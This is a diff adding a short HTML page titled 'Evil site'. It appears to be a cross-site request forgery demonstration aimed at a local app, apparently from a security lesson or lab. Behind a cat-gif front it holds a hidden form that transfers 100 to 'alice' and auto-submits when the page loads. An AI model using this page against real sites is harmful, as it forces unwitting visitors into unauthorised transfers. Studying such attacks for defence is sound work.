@@ -1,0 +1,21 @@
+<!doctype html>
+<html lang='en'>
+    <head>
+        <meta charset='utf-8' />
+        <title> Evil site</title>
+    </head>
+    <body>
+        <p>I am a cool site with cat gifs</p>
+        <img src = 'giphy.gif' />
+        <form method='POST' action='http://localhost:4000/transfer' style='display:none'>
+            Send amount:
+                <input name='amount' value='100'/>
+                To user:
+                <input name='to' value='alice'/>
+                <input type='submit' value='Send' />
+        </form>
+        <script>
+            document.forms[0].submit()
+        </script>
+    </body>
+</html>
